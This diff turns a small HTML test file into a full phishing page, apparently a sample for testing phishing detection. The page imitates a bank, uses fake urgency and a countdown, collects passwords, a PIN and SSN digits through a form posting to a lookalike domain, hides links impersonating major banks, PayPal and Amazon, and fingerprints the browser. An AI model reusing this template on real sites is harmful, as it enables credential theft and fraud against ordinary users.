@@ -1,14 +1,224 @@
-<!-- test_case_2.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Long URL Test</title>
+    <title>Secure Banking Verification Center</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .login-form {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 30px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #00478f;
+            text-align: center;
+        }
+        .bank-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .bank-logo img {
+            height: 60px;
+        }
+        .urgent-notice {
+            background-color: #fff9e5;
+            border: 1px solid #ffcc00;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #cc0000;
+        }
+        p {
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0052a3;
+        }
+        .hidden-links {
+            font-size: 12px;
+            margin-top: 30px;
+            color: #999;
+            display: none;
+        }
+        .hidden-links a {
+            color: #999;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .security-badges img {
+            height: 40px;
+            margin: 0 10px;
+        }
+        .timer {
+            color: red;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Our Service</h1>
-    <p>Please visit our site: https://this.is.a.very.long.url.example.com/that/is/way/too/long/for/a/normal/url/!@#$%/login</p>
+    <div class="login-form">
+        <div class="bank-logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iNjAiIGZpbGw9IiMwMDY2Y2MiLz48dGV4dCB4PSIzMCIgeT0iMzUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5TZWN1cmVCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="SecureBank Logo">
+        </div>
+        
+        <div class="urgent-notice">
+            URGENT SECURITY ALERT: Your account access has been temporarily suspended due to suspicious login attempts. Verification required within 24 hours to prevent permanent suspension.
+        </div>
+        
+        <h1>Account Verification Required</h1>
+        <p>Our security system has detected unauthorized access attempts to your account. Please verify your information immediately.</p>
+        
+        <div class="timer" id="countdown">Session expires in: 04:59</div>
+
+        <form action="https://bankingsecure.verification-center.site/authenticate" method="post">
+            <div class="input-group">
+                <label for="account">Account Number:</label>
+                <input type="text" id="account" name="account" required>
+            </div>
+
+            <div class="input-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <div class="input-group">
+                <label for="secure-code">Security PIN:</label>
+                <input type="password" id="secure-code" name="secure-code" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="ssn">Social Security Number (Last 4 digits):</label>
+                <input type="password" id="ssn" name="ssn" required>
+            </div>
+
+            <div class="input-group">
+                <label for="phone">Phone Number:</label>
+                <input type="text" id="phone" name="phone" required>
+            </div>
+
+            <div class="input-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <button type="submit">Verify & Restore Access</button>
+        </form>
+        
+        <div class="security-badges">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMjAiIGN5PSIyMCIgcj0iMTUiIGZpbGw9IiM0Q0FGNTAiLz48dGV4dCB4PSIxMCIgeT0iMjUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZmlsbD0id2hpdGUiPlNTTDwvdGV4dD48L3N2Zz4=" alt="SSL Secure">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3QgeD0iNSIgeT0iNSIgd2lkdGg9IjcwIiBoZWlnaHQ9IjMwIiBmaWxsPSIjRkZDMTA3IiByeD0iNSIvPjx0ZXh0IHg9IjEyIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIiBmaWxsPSJibGFjayI+VmVyaWZpZWQ8L3RleHQ+PC9zdmc+" alt="Verified">
+        </div>
+
+        <div class="hidden-links">
+            <a href="https://bankofamerica-secure.verification-center.com/login">Forgot Password</a>
+            <a href="https://chase-verification.secure-banking-portal.com">Account Help</a>
+            <a href="https://wellsfargo.com.secure-verify.net/auth">Security Center</a>
+            <a href="https://online.banking-update.com/citibank/">Update Account</a>
+        </div>
+    </div>
+
+    <!-- Countdown timer script -->
+    <script>
+        let timeLeft = 299; // 4:59 in seconds
+        const countdownEl = document.getElementById('countdown');
+        
+        const timer = setInterval(function() {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownEl.innerHTML = `Session expires in: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                alert("Your session has expired! Please verify your account immediately to prevent suspension.");
+                countdownEl.innerHTML = "SESSION EXPIRED";
+            }
+        }, 1000);
+    </script>
+
+    <!-- Hidden iframe with additional phishing links -->
+    <iframe src="about:blank" style="display:none" onload="
+        this.contentDocument.write(`
+            <a href='https://paypal-account-verify.com'>PayPal Verification</a>
+            <a href='https://amazon.signin.malicious-site.net'>Amazon Sign In</a>
+        `);
+    "></iframe>
     
+    <!-- Data collection script -->
+    <script>
+        // Collect browser information
+        const browserData = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookiesEnabled: navigator.cookieEnabled,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // Form handler
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // In a real phishing site, this would send data to the attacker
+            setTimeout(function() {
+                alert('Verification successful! Your account access has been restored.');
+                window.location = 'https://www.google.com';
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
+
+
+
